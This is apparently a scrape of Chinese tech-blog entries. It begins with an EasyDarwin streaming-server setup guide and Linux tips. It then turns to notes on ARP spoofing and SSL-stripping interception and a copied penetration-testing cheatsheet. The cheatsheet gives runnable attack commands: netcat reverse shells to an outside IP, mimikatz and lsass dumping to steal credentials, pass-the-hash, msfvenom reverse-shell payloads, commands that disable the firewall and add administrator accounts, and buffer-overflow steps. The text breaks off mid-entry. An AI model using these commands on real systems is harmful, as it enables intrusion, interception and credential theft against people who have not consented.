\u0026\n\n  注：无论是Windows还是Linux运行EasyDarwin，以Debug模式运行时，-c后面带的配置文件路径可以是相对路径也可以是绝对路径，但是以服务/后台方式运行，就必须是用绝对路径！\n\n5、检查EasyDarwin是否部署成功 \n\n通过访问EasyDarwin RESTful接口可以初步判断EasyDarwin流媒体服务器是否已经运行起来了，例如我们可以访问：rtsp://[ip]:[http\\service\\port]/api/getrtsppushsessions 接口查看EasyDarwin是否运行响应，后面的版本我们会增加一个获取EasyDarwin整体运行配置信息RESTful接口，这样在外部就能查看EasyDarwin是否读取到了正确的用户配置；\n\n调用方法 \n\nMP4点播 \n我们将经过Hint处理过的mp4文件存在moviefolder目录中，访问RTSP地址：\n\n    rtsp://[ip]:[rtspport]/[filename]\n例如EasyDarwin服务器地址：8.8.8.8，rtspport配置为：8554，MP4文件名：demo.mp4，用vlc或者ffplay等播放器访问：rtsp://8.8.8.8:8554/demo.mp4；\n  1. 经常会有用户发现自己的mp4文件无法点播，服务器端返回“415 Unsupported Media type”，这是因为MP4文件需要经过RTSP/RTP Hint处理才行，可以用MP4Box等工具进行一下Hint处理；\n  2. EasyDarwin后续将移除点播模块（QTSSFileModule），HTTP/HLS点播将会比RTSP点播效果更好；\n\n推模式转发 \n\n直接通过标准RTSP/RTP推送流程（ANNOUNCE/SETUP/PLAY/RTP）向EasyDarwin推送音视频数据进行转发和分发，例如rtspport配置为8554，那我们可以直接用EasyDarwin EasyPusher或者live555 DarwinInjector向8554端口进行直播推送，推送后，我们可以通过  rtsp://[ip]:[http\\service\\port]/api/getrtsppushsessions  接口获取当前正在进行RTSP直播的列表；\n\n拉模式转发 \n\n调用接口（用vlc、ffplay、live555、EasyPlayer等RTSP Client调用）\n\n    RTSP://[ip]:[rtspport]/EasyRelayModule?name=[relayName]\u0026url=\"[RTSPURL]\"\n\n例如EasyDarwin服务器IP地址是：8.8.8.8，RTSP端口(rtspport)：554，IPCamera的RTSP地址是：rtsp://admin:admin@192.168.66.189/22，那么我们可以：\n\n1、配置easydarwin.xml EasyRelayModule\n\n\tPREF NAME=\"localipaddress\" 8.8.8.8/PREF\n\n2、请求转发：RTSP://8.8.8.8:554/EasyRelayModule?name=live\u0026url=\"rtsp://admin:admin@192.168.66.189/22\"   （name是定义一个拉模式转发流的唯一标识，不允许重复）\n\n3、直播URL：RTSP://8.8.8.8:554/EasyRelayModule?name=live\n\n4、请求停止转发：RTSP://8.8.8.8:554/EasyRelayModule?name=live\u0026cmd=stop  （cmd=stop表示停止拉模式转发）\n\nEasyDarwin HLS直播配置 \n\n1、安装配套HTTP服务器 \n\nWindows环境（Windows下可以使用IIS或者Nginx，或者其他的HTTP服务器，Windows下以IIS为例）\n\n新建一个站点，指向EasyDarwin的Movies目录（font color=\"red\"注意这里Movies文件夹中应有crossdomain.xml配置文件/font）\n\n  \n\n在MIME中添加.m3u8和.ts文件类型\n\n  注：ts与.m3u8的添加类似，这里不再截图。  \n\nLinux环境（Linux下可以使用Apache或者Nginx等等，建议使用Nginx比较简单，Linux下以Nginx为例）\n\n安装Nginx  \n\npre\napt-get install nginx\n/pre\n\n安装完成后，在浏览器输入127.0.0.1，验证是否安装成功，如下图，则安装成功  \n\n  配置Nginx默认路径  \n找到Nginx默认配置文件，获取并记录web根目录位置，例如这里位置是：/var/www/html/  \n  \n\n配置允许跨域访问\n\nfont color=\"red\"将EasyDarwin开源项目Movies目录中的crossdomain.xml文件放到nginx的web目录/font，例如这里就放到/var/www/html/\n\n重启服务(如果修改了nginx配置)\n\npre\n/usr/sbin/nginx  -s reload\n/pre\n注：Nginx配置方式在不同版本不同的系统中可能略有差异！\n\n2、拉模式HLS直播配置 \n\nEasyDariwn项目中集成了Mongoose服务器，可以通过Web配置EasyDarwin相关参数。\n\n1、登录Web配置\n\n在浏览器中输入如下地址，打开配置页面（用户名和密码都是admin）：   \n\n    http://[ip]:8088\n\n2、HLS直播配置\n\n设置配置完成的HTTP服务器的地址，以及ts相关参数  \n\n3、流媒体文件目录配置\n\n点击系统中的基本设置，设置流媒体文件的目录，以Linux系统nginx做WEB服务器为例，比如我们将点播文件存储在/var/www/html/目录\n\n  注： font color=\"red\"2，3步配置完成后，需要重启EasyDarwin服务器，Debug方式运行需要手动重启服务器，以服务/后台方式运行，可以直接使用Web端中的重启功能。/font\n\n4、增加HLS直播  \n\n设置拉取的网络设备的RTSP地址，如：rtsp://admin:admin@10.0.0.3/，点击HLS直播列表增加一个直播\n\n   \n\n设置完成后，在HLS直播列表中会出现我们刚刚设置好的直播项，点击Play可以直接进行HLS直播\n\n3、推模式HLS直播配置 \n\nHLS直播配置，流媒体文件目录配置和拉模式HLS直播配置中的一样\n\n1、是否同步输出HLS设置  \n\n点击RTSP直播配置，勾选上“是否同步输出HLS”的选项，点击保存，然后重启服务器\n\n2、推送数据\n\n可以使用EasyPusher推送RTSP数据到EasyDarwin，具体使用方法，请参考http://doc.easydarwin.org/EasyPusher/README/  \n\n3、自动生成HLS直播项，点击播放\n\nFAQ \n\n1. EasyDarwin返回401 Unauthorized \n\n在easydarwin.xml中配置的Movies目录里面放一个名为qtaccess的文件，内容为：\n\n\tLimit WRITE  \n\trequire any-user  \n\t/Limit\n\tLimit READ\n\trequire any-user\n\t/Limit\n\n2. RTSP推送到EasyDarwin出现404错误 \n\n方法一：用EasyPusher做直播推送；\n\n方法二：修改RTSP ANNOUNCE里面的sdp信息，把 \"o=- %u %u IN IP4 %s/r/n\" 和 \"c=IN IP4 %s/r/n\"里面的ip地址改成127.0.0.1就可以了;\n\n方法三：我们将EasyDarwin部署到公网，当服务器置身内网，用端口映射的方式对外提供服务，在接收RTSP/RTP推送的时候，经常会出现在SETUP步骤Darwin返回404错误，经过查找原因，主要是EasyDarwin对推送的sdp信息中的IP地址不能识别，服务器并不知道自己已经置身于公网的地址：\n\nifconfig查看地址信息\n\nip addr查看eth0地址列表\n\n我们通过命令：ip addr add dev eth0 [公网IP]，向eth0添加一个公网地址就解决问题了：\n\nWindows添加公网地址的方法：\n\n3. EasyDarwin做转发延时10几秒? \n\n在EasyDarwin QTSSReflectorModule转发模块中，有一个控制转发Buffer时间的配置reflectorbuffersizesec，我们将这个配置改成0，也就是在服务器端不做缓存，直接转发，这样在网络条件充足的情况下对比转发和实时流，转发带来的延时也几乎可以忽略了：\n\n4. 看不到直播或者点播视频，如何排查? \n\n我们可以先配置easydarwin.xml文件中的\n\n\tPREF NAME=\"RTSPdebugprintfs\" TYPE=\"Bool16\" true/PREF\n\n字段为true，然后重新启动EasyDarwin，请求EasyDarwin，如果一点报文都没有打印，那就是你访问的地址错了！如果报文有打印，那就可以具体看看返回的错误码是多少了，错误码对照表：\n\ntable\n\ttbody\n\t\ttrtdem响应码/em/tdtdem报文描述/em/tdtdem定义/em/td/tr\n\t\ttrtd200/tdtdSuccess OK/tdtd成功创建/td/tr\n\t\ttrtd201/tdtdSuccess Created/tdtd成功创建/td/tr\n\t\ttrtd202/tdtdSuccess Accepted\t/tdtd已接受用于处理，但处理尚未完成/td/tr\n\t\ttrtd204/tdtdSuccess No Content\t/tdtd已接收请求，但不存在要回送的信息/td/tr\n\t\ttrtd206/tdtdSuccess Partial Content\t/tdtd已接收请求，但要回送的信息不完整/td/tr\n\t\ttrtd301/tdtdRedirect Permanent Moved\t/tdtd请求的数据具有新的位置且更改是永久的。/td/tr\n\t\ttrtd302/tdtdRedirect Temp Moved\t/tdtd请求的数据临时具有不同 URI/td/tr\n\t\ttrtd303/tdtdRedirect See Other\t/tdtd可在另一 URI 下找到对请求的响应/td/tr\n\t\ttrtd305/tdtdUse Proxy\t/tdtd必须通过位置字段中提供的代理来访问请求的资源/td/tr\n\t\ttrtd400/tdtdClient Bad Request\t/tdtd请求中有语法问题，或不能满足请求/td/tr\n\t\ttrtd401/tdtdClient Unauthorized\t/tdtd未授权客户端访问数据/td/tr\n\t\ttrtd402/tdtdPayment Required\t/tdtd需要付款,表示计费系统已有效/td/tr\n\t\ttrtd403/tdtdClient Forbidden\t/tdtd禁止, 即使有授权也不需要访问/td/tr\n\t\ttrtd404/tdtdNot Found\t/tdtd服务器找不到给定的资源/td/tr\n\t\ttrtd405/tdtdMethod Not Allowed\t/tdtd请求的方法不支持/td/tr\n\t\ttrtd407/tdtdProxy Authentication Required\t/tdtd代理认证请求，客户机首先必须使用代理认证自身/td/tr\n\t\ttrtd408/tdtdRequest Timeout\t/tdtd请求超时/td/tr\n\t\ttrtd409/tdtdConflict\t/tdtd请求冲突/td/tr\n\t\ttrtd412/tdtdPrecondition Failed\t/tdtd前提条件失败/td/tr\n\t\ttrtd415/tdtdUnsupported Media Type\t/tdtd服务器拒绝服务请求，因为不支持请求实体的格式/td/tr\n\t\ttrtd500/tdtdServer Internal Error\t/tdtd内部错误,因为意外情况，服务器不能完成请求/td/tr\n\t\ttrtd501/tdtdServer Not Implemented\t/tdtd未执行,服务器不支持请求/td/tr\n\t\ttrtd502/tdtdServer Bad Gateway\t/tdtd错误网关,服务器接收到来自上游服务器的无效响应/td/tr\n\t\ttrtd503/tdtdServer Unavailable\t/tdtd由于临时过载或无法获得服务护,服务器无法处理请求/td/tr\n\t\ttrtd505/tdtdRTSP Version Not Supported\t/tdtd不支持的RTSP版本/td/tr\n\n\t/tbody\n/table\n\n5. mp4点播返回415错误(Requested movie hasn't been hinted) \n\nMP4文件需要先经过RTSP/RTP Hint处理，处理工具可以选择MP4Box或者MediaCoder等；\n\n6. /bin/sh^M: bad interpreter: No such file or directory \n\n感谢QQ:591003999提供的完整解决方案\n\n从git上导下来的Buildit的格式是：fileformat=dos，但是在Linux下的话 是需要fileformat=unix 所以 ./Buildit 就出现错误 无法执行，需要修改文件格式，\n\n在Windows下转换：\n\n  利用一些编辑器如UltraEdit或EditPlus等工具先将脚本编码转换，再放到Linux中执行。转换方式如下\n    （UltraEdit）：File--  Conversions--  DOS-  UNIX\n    即可。\n\n也可在Linux中转换：\n\n  首先要确保文件有可执行权限\n    #sh  chmod a+x filename\n    然后修改文件格式\n    #sh  vi filename\n    利用如下命令查看文件格式\n    :set ff 或 :set fileformat\n    可以看到如下信息\n    fileformat=dos 或 fileformat=unix\n    利用如下命令修改文件格式\n    :set ff=unix 或 :set fileformat=unix\n    :wq (存盘退出)\n      (又或者用：dos2unix ./Buildit直接修改编码更方便，BTW：感谢Denny.bai提供的方法)\n      最后再执行文件\n    #sh  ./filename\n  ## 获取更多信息 ##\n\n邮件：support@easydarwin.org\n\nWEB：www.EasyDarwin.org\n\nQQ交流群：288214068\n\nCopyright \u0026copy; EasyDarwin.org 2012-2016\n\n","tags":null},{"location":"//blog.pytool.com/Linux/2010-01-01 Linux 基础命令","title":"Linux常用技巧","text":"---\n目前的稳定版本为Debian Jessie，目前的测试版本为Debian Stretch，不稳定版本永远为Debian sid\nLinux命令大全\n命令行的艺术\ncommand-line-cookbook\n11个让你吃惊的 Linux 终端命令 \n\n按键绑定\n  bindkey  查看所有绑定的快捷键\n  bindkey '^Z' fancy-ctrl-z # 绑定一个函数到快捷键上\n  ：先按下Ctrl+V,然后按下F12 .我们就可以得到F12的字符序列 ^\\[\\[24~。\n  【附】也可以使用showkey -a命令查看按键对应的字符序列。\n\necho '{\"id\":1,\"1\":\"li\"}'|jq '.\"1\"'\n快速开启http服务\npython -m SimpleHTTPServer 4000\nruby -run -e httpd . -p 9090\n\npython -m SimpleHTTPServer 8000\n\nphp -S 127.0.0.1:8088 router.php\n\n解码base64\necho 'Qml0ZSBtZSBpZiB5b3UgY2FuISEhISEhIQo=' | base64 --decode\n多线程下载axel\naxel -q -n 10 -o /tmp/ http://soft.vpser.net/lnmp/lnmp0.7-full.tar.gz\n 格式转换\niconv -f UTF-8 -t ISO-8859-15 infile   outfile\n\n将命令的输出变成一个值来幅给变量\nname=basename /usr/include/stdio.h\nname=$(basename /usr/include/stdio.h)\n\n 按名称杀死进程\nkillall emacs24\n\n查看某条命令具体用法\nwhatis\t显示和word相关的命令\n\n 查找相关命令\n如果遇到想完成某个功能，但具体命令忘了的时候怎么办\napropos sort :查找和sort相关的命令\nman -k who  \n\n查看按键的keycode\nshowkey程序可以知道你的按键是否拥有一个keycode\n\n 字符串切割\nname=\"chickensoup.tar.gz\"\n${NAME##fo} 切割字符；\n(单次匹配start)       echo ${name#.}   tar.gz\n(贪婪匹配头)          echo ${name##.}  gz\n%   (单词匹配end)       # echo ${name%.}   chickensoup.tar\n%%  (匹配尽量长end)     # echo ${name%%.}  chickensoup\n${NAME:0:3} 直接取子串  # echo ${name:0:3}  chi\n\n截取文件名\nbasename /usr/include/stdio.h     stdio.h\nbasename /usr/include/stdio.h .h  stdio\n 获取路径\ndirname /usr/include/stdio.h      /usr/include/\n\n以指定用户执行sudo -u www-data \nsudo cp -r .ssh /var/www\nsudo chown -R www-data:www-data /var/www/.ssh\nsudo mkdir /var/www/html\nsudo chown -R www-data:www-data /var/www/html\nsudo -u www-data git clone git@git.oschina.net:keyixinxi/chengzhi.git\nsudo mkdir /var/www/mysql\nsudo chown -R mysql:mysql /var/www/mysql\nsudo -u mysql mkdir chengzhi\n\n sudo cat \u003c EOF  File doesn't work, sudo su does\nsudo bash -c 'cat   /etc/nginx/sites-enabled/chengzhi.conf \u003c","tags":null},{"location":"//blog.pytool.com/Hacker/02_欺骗嗅探/2016-01-01 嗅探基本原理","title":"嗅探基本原理","text":"fragrouter -B1\ndnsspoof -i ath0 (or whatever network interface you are using)\n webmitm -d\n ettercap -T -M arp:remote /router addy/ /victim addy/\n ssldump -r your.cap -w webmitm.crt  -d   out\n########\necho 1   /proc/sys/net/ipv4/ipforward\niptables -t nat -A PREROUTING -p tcp –dport 443 -j REDIRECT\niptables -A FORWARD -j ACCEPT\nwebmitm -d\n\nettercap –G\nunified\nath0\narp poision\nstart sniffing\n\n#########\n原文\nkate  /etc/etter.conf\nuncomment redircommandoff in the iptables, linux section\necho 1   /proc/sys/net/ipv4/ipforward\narpspoof -i wlan0 -t 192.168.1.6 192.168.1.1\niptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000\nettercap -T -q -i wlan0\n\nsslstrip -a -k -f\nettercap -T -q -i wlan0\n\n Alternative\nwireshark\n\nkate  /etc/etter.conf\n\necho \"1\"   /proc/sys/net/ipv4/ip_forward\niptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000\n\narpspoof -i eth0 -t 192.168.1.12 192.168.1.1\nettercap -T -q -i eth0 -M ARP /192.168.1.1/ /192.168.1.12/\n\nettercap -T -q -i eth0\n\nsslstrip -k -f\n\n####\n\npassword=','pwd=','username=','user=','pass=','email='\n网络密码嗅探（Web/FTP/Email）工具 – SniffPass\nmetasploit下的auxiliary/sniffer/psnuffle\nettercap\n\n数据流量重定向\n\n关于数据怎么重定向到你的电脑上面也就是你怎么成为靶机和服务器的中间人，这个问题不是我们今天讨论的重点，但是因为跟本文还是有点关系，我给出几个建议方式吧：\n\n1、ARP攻击\n进内网……还用我多说么？永恒的传奇，不老的ARP。\n2、DNS劫持\n将靶机的DNS劫持到这里来，想做什么就好说了。\n3、WIFI钓鱼\n拿着个树莓派改装版或者拿着菠萝瞎溜达，哪里人多找哪里。\n4、修改hosts文件\n把舍友暴打一顿，然后把他的电脑的hosts文件改掉，反正他也不懂。\n5、修改默认网关\n把舍友暴打一顿，然后把他的电脑的默认网关改成自己的IP，反正他也不懂。\n……\n ARP 欺骗工具\nARPspoof\nCain\u0026abel\nEttercap\nARPoison\nDsniff\nParasite\n\nSSL\n\nhttps://github.com/droe/sslsplit","tags":null},{"location":"//blog.pytool.com/Hacker/2017-08-30 pintest","title":"pentest-cheatsheet","text":"pentest-cheatsheet\n\nFrom: https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/\nNmap Full Web Vulnerable Scan\n\tcd /usr/share/nmap/scripts/\n\twget http://www.computec.ch/projekte/vulscan/download/nmapnsevulscan-2.0.tar.gz \u0026\u0026 tar xzf nmapnsevulscan-2.0.tar.gz\n\tnmap -sS -sV --script=vulscan/vulscan.nse target\n\tnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target\n\tnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target\n\tnmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target\n\tnmap -sV --script=vuln target\n\tnmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target\n\n\tDirb Dir Bruteforce:\n\tdirb http://IP:PORT /usr/share/dirb/wordlists/common.txt\n\n\tNikto web server scanner\n\tnikto -C all -h http://IP\n\n\tWordPress Scanner\n\tgit clone https://github.com/wpscanteam/wpscan.git \u0026\u0026 cd wpscan\n\t./wpscan –url http://IP/ –enumerate p\n\n\tHTTP Fingerprinting\n\twget http://www.net-square.com/assets/httprintlinux301.zip \u0026\u0026 unzip httprintlinux301.zip\n\tcd httprint301/linux/\n\t./httprint -h http://IP -s signatures.txt\n\n\tSKIP Fish Scanner\n\tskipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP\n\n\tNmap Ports Scan\n\t1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)\n\t1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)\n\t2)fragement\n\t3)data packed – like orginal one not scan packet\n\t4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target\n\t5)nmap –source-port 53 target\n\tnmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)\n\tnmap -Pn -T2 -sV –randomize-hosts IP1,IP2\n\tnmap –script smb-check-vulns.nse -p445 target (using NSE scripts)\n\tnmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)\n\tnmap -sA -PN -sN target\n\tnmap -sS -sV -T5 -F -A -O target (version detection)\n\tnmap -sU -v target (Udp)\n\tnmap -sU -P0 (Udp)\n\tnmap -sC 192.168.31.10-12 (all scan default)\n\n\tNC Scanning\n\tnc -v -w 1 target -z 1-1000\n\tfor i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done\n\n\tUnicornscan\n\tus -H -msf -Iv 192.168.56.101 -p 1-65535\n\tus -H -mU -Iv 192.168.56.101 -p 1-65535\n\t-H resolve hostnames during the reporting phase\n\t-m scan mode (sf - tcp, U - udp)\n\t-Iv - verbose\n\n\tXprobe2 OS fingerprinting\n\txprobe2 -v -p tcp:80:open IP\n\n\tSamba Enumeration\n\tnmblookup -A target\n\tsmbclient //MOUNT/share -I target -N\n\trpcclient -U \"\" target\n\tenum4linux target\n\n\tSNMP Enumeration\n\tsnmpget -v 1 -c public IP\n\tsnmpwalk -v 1 -c public IP\n\tsnmpbulkwalk -v2c -c public -Cn0 -Cr10 IP\n\n\tWindows Useful cmds\n\tnet localgroup Users\n\tnet localgroup Administrators\n\tsearch dir/s .doc\n\tsystem(\"start cmd.exe /k $cmd\")\n\tsc create microsoftupdate binpath=\"cmd /K start c:\\nc.exe -d ip-of-hacker port -e cmd.exe\" start= auto error= ignore\n\t/c C:\\nc.exe -e c:\\windows\\system32\\cmd.exe -vv 23.92.17.103 7779\n\tmimikatz.exe \"privilege::debug\" \"log\" \"sekurlsa::logonpasswords\"\n\tProcdump.exe -accepteula -ma lsass.exe lsass.dmp\n\tmimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"log\" \"sekurlsa::logonpasswords\"\n\tC:\\temp\\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits\n\tC:\\temp\\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits\n\n\tEnable RDP Access\n\treg add \"hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections /t REGDWORD /d 0\n\tnetsh firewall set service remoteadmin enable\n\tnetsh firewall set service remotedesktop enable\n\n\tTurn Off Windows Firewall\n\tnetsh firewall set opmode disable\n\n\tAdd New user in Windows\n\tnet user test 1234 /add\n\tnet localgroup administrators test /add\n\n\tMimikatz use\n\tgit clone https://github.com/gentilkiwi/mimikatz.git\n\tprivilege::debug\n\tsekurlsa::logonPasswords full\n\n\tPassing the Hash\n\tgit clone https://github.com/byt3bl33d3r/pth-toolkit\n\tpth-winexe -U hash //IP cmd\n\n\tPuTTY Link tunnel\n\tForward remote port to local address\n\tplink.exe -P 22 -l root -pw \"1234\" -R 445:127.0.0.1:445 IP\n\n\tMeterpreter portfwd\n\t# https://www.offensive-security.com/metasploit-unleashed/portfwd/\n\t# forward remote port to local address\n\tmeterpreter   portfwd add –l 3389 –p 3389 –r 172.16.194.141\n\tkali   rdesktop 127.0.0.1:3389\n\n\tMeterpreter VNC\\RDP\n\t# https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/\n\trun getgui -u admin -p 1234\n\trun vnc -p 5043\n\n\tor\n\n\tapt-get install freerdp-x11\n\txfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP\n\n\tor\n\n\tmeterpreter   run post/windows/gather/hashdump\n\tAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\n\tmsf   use exploit/windows/smb/psexec\n\tmsf exploit(psexec)   set payload windows/meterpreter/reversetcp\n\tmsf exploit(psexec)   set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c\n\tmsf exploit(psexec)   exploit\n\tmeterpreter   shell\n\n\tHashcat password cracking\n\thashcat -m 400 -a 0 hash /root/rockyou.txt\n\n\tNetcat examples\n\tc:  nc -l -p 31337\n\t#nc 192.168.0.10 31337\n\tc:  nc -v -w 30 -p 31337 -l \u003c secret.txt\n\t#nc -v -w 2 192.168.0.10 31337   secret.txt\n\n\tBanner grabbing with NC\n\tnc 192.168.0.10 80\n\tGET / HTTP/1.1\n\tHost: 192.168.0.10\n\tUser-Agent: Mozilla/4.0\n\tReferrer: www.example.com\n\tenter\n\tenter\n\n\tWindow reverse shell\n\tc:  nc -Lp 31337 -vv -e cmd.exe\n\tnc 192.168.0.10 31337\n\tc:  nc example.com 80 -e cmd.exe\n\tnc -lp 80\n\n\tLinux shell\n\tnc -lp 31337 -e /bin/bash\n\tnc 192.168.0.10 31337\n\tnc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000\n\n\tFind SUID\\SGID root files\n\t# Find SUID root files\n\tfind / -user root -perm -4000 -print\n\t# Find SGID root files:\n\tfind / -group root -perm -2000 -print\n\t# Find SUID and SGID files owned by anyone:\n\tfind / -perm -4000 -o -perm -2000 -print\n\t# Find files that are not owned by any user:\n\tfind / -nouser -print\n\t# Find files that are not owned by any group:\n\tfind / -nogroup -print\n\t# Find symlinks and what they point to:\n\tfind / -type l -ls\n\n\tPython shell\n\tpython -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n\tPython\\Ruby\\PHP HTTP Server\n\tpython2 -m SimpleHTTPServer\n\tpython3 -m http.server\n\truby -rwebrick -e \"WEBrick::HTTPServer.new(:Port =  8888, :DocumentRoot =  Dir.pwd).start\"\n\tphp -S 0.0.0.0:8888\n\n\tGet PIDs of process\n\tfuser -nv tcp 80\n\tfuser -k -n tcp 80\n\n\tHydra rdp Bruteforce\n\thydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp\n\n\tMount Remote Windows Share\n\tsmbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw\n\n\tCompiling Exploit in Kali\n\tgcc -m32 -o output32 hello.c (32 bit)\n\tgcc -m64 -o output hello.c (64 bit)\n\n\tCompiling Windows Exploits on Kali\n\twget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download\n\twine mingw-get-setup.exe\n\tselect mingw32-base\n\tcd /root/.wine/drivec/windows\n\twget http://gojhonny.com/misc/mingwbin.zip \u0026\u0026 unzip mingwbin.zip\n\tcd /root/.wine/drivec/MinGW/bin\n\twine gcc -o ability.exe /tmp/exploit.c -lwsock32\n\twine ability.exe\n\n\tNASM Commands\n\tnasm -f bin -o payload.bin payload.asm\n\tnasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload\n\n\tSSH Pivoting\n\tssh -D 127.0.0.1:1080 -p 22 user@IP\n\tAdd socks4 127.0.0.1 1080 in /etc/proxychains.conf\n\tproxychains commands target\n\n\tSSH Pivoting from One Network to Another\n\tssh -D 127.0.0.1:1080 -p 22 user1@IP1\n\tAdd socks4 127.0.0.1 1080 in /etc/proxychains.conf\n\tproxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2\n\tAdd socks4 127.0.0.1 1081 in /etc/proxychains.conf\n\tproxychains commands target\n\n\tPivoting Using metasploit\n\troute add X.X.X.X 255.255.255.0 1\n\tuse auxiliary/server/socks4a\n\trun\n\tproxychains msfcli windows/ PAYLOAD=windows/meterpreter/reversetcp LHOST=IP LPORT=443 RHOST=IP E\n\n\tor\n\n\t# https://www.offensive-security.com/metasploit-unleashed/pivoting/\n\tmeterpreter   ipconfig\n\tIP Address  : 10.1.13.3\n\tmeterpreter   run autoroute -s 10.1.13.0/24\n\tmeterpreter   run autoroute -p\n\t10.1.13.0          255.255.255.0      Session 1\n\tmeterpreter   Ctrl+Z\n\tmsf auxiliary(tcp)   use exploit/windows/smb/psexec\n\tmsf exploit(psexec)   set RHOST 10.1.13.2\n\tmsf exploit(psexec)   exploit\n\tmeterpreter   ipconfig\n\tIP Address  : 10.1.13.2\n\n\tExploit-DB search using CSV File\n\tgit clone https://github.com/offensive-security/exploit-database.git\n\tcd exploit-database\n\t./searchsploit –u\n\t./searchsploit apache 2.2\n\t./searchsploit \"Linux Kernel\"\n\n\tcat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep \"\u003c|\u003c=\" | sort -k3\n\n\tMSF Payloads\n\tmsfvenom -p windows/meterpreter/reversetcp LHOST=IP Address X   system.exe\n\tmsfvenom -p php/meterpreter/reversetcp LHOST=IP Address LPORT=443 R   exploit.php\n\tmsfvenom -p windows/meterpreter/reversetcp LHOST=IP Address LPORT=443 -e -a x86 --platform win -f asp -o file.asp\n\tmsfvenom -p windows/meterpreter/reversetcp LHOST=IP Address LPORT=443 -e x86/shikataganai -b \"\\x00\" -a x86 --platform win -f c\n\n\tMSF Linux Reverse Meterpreter Binary\n\tmsfvenom -p linux/x86/meterpreter/reversetcp LHOST=IP Address LPORT=443 -e -f elf -a x86 --platform linux -o shell\n\tMSF Reverse Shell (C Shellcode)\n\tmsfvenom -p windows/shellreversetcp LHOST=127.0.0.1 LPORT=443 -b \"\\x00\\x0a\\x0d\" -a x86 --platform win -f c\n\tMSF Reverse Shell Python Script\n\tmsfvenom -p cmd/unix/reversepython LHOST=127.0.0.1 LPORT=443 -o shell.py\n\tMSF Reverse ASP Shell\n\tmsfvenom -p windows/meterpreter/reversetcp LHOST=Your IP Address LPORT=Your Port to Connect On -f asp -a x86 --platform win -o shell.asp\n\tMSF Reverse Bash Shell\n\tmsfvenom -p cmd/unix/reversebash LHOST=Your IP Address LPORT=Your Port to Connect On -o shell.sh\n\tMSF Reverse PHP Shell\n\tmsfvenom -p php/meterpreterreversetcp LHOST=Your IP Address LPORT=Your Port to Connect On -o shell.php\n\tadd \u003c?php at the beginning\n\tperl -i~ -0777pe's/^/\u003c?php \\n/' shell.php\n\tMSF Reverse Win Bin\n\tmsfvenom -p windows/meterpreter/reversetcp LHOST=Your IP Address LPORT=Your Port to Connect On -f exe -a x86 --platform win -o shell.exe\n\n\tLinux Security Commands\n\t# find programs with a set uid bit\n\tfind / -uid 0 -perm -4000\n\t# find things that are world writable\n\tfind / -perm -o=w\n\t# find names with dots and spaces, there shouldn’t be any\n\tfind / -name \" \" -print\n\tfind / -name \"..\" -print\n\tfind / -name \". \" -print\n\tfind / -name \" \" -print\n\t# find files that are not owned by anyone\n\tfind / -nouser\n\t# look for files that are unlinked\n\tlsof +L1\n\t# get information about procceses with open ports\n\tlsof -i\n\t# look for weird things in arp\n\tarp -a\n\t# look at all accounts including AD\n\tgetent passwd\n\t# look at all groups and membership including AD\n\tgetent group\n\t# list crontabs for all users including AD\n\tfor user in $(getent passwd|cut -f1 -d:); do echo \"### Crontabs for $user ####\"; crontab -u $user -l; done\n\t# generate random passwords\n\tcat /dev/urandom| tr -dc ‘a-zA-Z0-9-!@#$%^\u0026()+{}|:?=’|fold -w 12| head -n 4\n\t# find all immutable files, there should not be any\n\tfind . | xargs -I file lsattr -a file 2  /dev/null | grep ‘^….i’\n\t# fix immutable files\n\tchattr -i file\n\n\tWin Buffer Overflow Exploit Commands\n\tmsfvenom -p windows/shellbindtcp -a x86 --platform win -b \"\\x00\" -f c\n\tmsfvenom -p windows/meterpreter/reversetcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikataganai -b \"\\x00\" -f c\n\tCOMMONLY USED BAD CHARACTERS:\n\t\\x00\\x0a\\x0d\\x20                              For http request\n\t\\x00\\x0a\\x0d\\x20\\x1a\\x2c\\x2e\\3a\\x5c           Ending with (0\\n\\r)\n\t# Useful Commands:\n\tpattern create\n\tpattern offset (EIP Address)\n\tpattern offset (ESP Address)\n\tadd garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )\n\n\t!pvefindaddr patterncreate 5000\n\t!pvefindaddr suggest\n\t!pvefindaddr modules\n\t!pvefindaddr nosafeseh\n\n\t!mona config -set workingfolder C:\\Mona\\%p\n\t!mona config -get workingfolder\n\t!mona mod\n\t!mona bytearray -b \"\\x00\\x0a\"\n\t!mona pc 5000\n\t!mona po EIP\n\t!mona suggest\n\n\tSEH - Structured Exception Handling\n\t# 